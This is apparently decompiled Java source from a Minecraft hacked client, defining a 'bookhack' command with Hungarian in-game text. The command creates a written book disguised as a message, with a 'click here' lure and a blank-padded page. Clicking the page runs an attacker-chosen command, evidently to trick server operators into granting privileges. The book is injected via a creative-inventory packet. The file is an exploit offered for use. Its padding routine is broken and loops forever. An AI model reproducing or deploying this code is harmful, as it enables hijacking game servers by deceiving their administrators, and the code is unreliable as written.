package DTool.command.impl;

import DTool.command.*;
import net.minecraft.item.*;
import net.minecraft.init.*;
import net.minecraft.nbt.*;
import Mood.*;
import net.minecraft.client.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;

public class BookHack extends Command
{
    public BookHack() {
        super("bookhack", "bookhack", "bookhack", new String[] { "bookhack" });
    }
    
    public static ItemStack getForceOpBook(final String s) {
        final ItemStack itemStack = new ItemStack(Items.written_book);
        final NBTTagCompound tagCompound = new NBTTagCompound();
        final NBTTagList list = new NBTTagList();
        list.appendTag(new NBTTagString("{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"%COMMAND%\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":{\"text\":\"%HOVERTEXT%\"}},\"text\":\"%TEXT%\"}".replace("%COMMAND%", s).replace("%HOVERTEXT%", "§8§l[§6§lKattints ide!§8§l]").replace("%TEXT%", getSpaces())));
        tagCompound.setTag("pages", list);
        tagCompound.setString("author", "§8§l[§6§lAndy§8§l]:§7§o \u00dczenet \u00e9rkezett.");
        tagCompound.setByte("resolved", (byte)1);
        tagCompound.setString("title", "§6§lK\u00f6nyv");
        itemStack.setTagCompound(tagCompound);
        return itemStack;
    }
    
    private static String getSpaces() {
        String string = "";
        while (0 < 500) {
            string = String.valueOf(string) + " ";
            int n = 0;
            ++n;
        }
        return string;
    }
    
    @Override
    public void onCommand(final String[] array, final String s) {
        if (array.length == 0) {
            Segito.msg("§7K\u00e9rlek, adj meg egy parancsot.");
        }
        else {
            Minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, getForceOpBook(String.join(" ", (CharSequence[])array))));
            Segito.msg("Az§e Item§7 sikeresen le lett k\u00e9rve!");
        }
    }
}
